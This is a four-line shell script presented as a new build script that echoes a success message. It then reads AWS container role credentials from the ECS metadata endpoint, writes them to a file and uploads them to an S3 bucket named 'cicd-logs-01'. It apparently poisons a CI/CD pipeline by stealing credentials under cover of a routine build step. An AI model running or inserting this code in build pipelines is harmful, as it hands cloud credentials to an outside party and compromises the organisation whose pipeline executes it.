echo "New build script worked"
echo "AWS"
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI -o creds.txt
aws s3 cp creds.txt s3://cicd-logs-01/
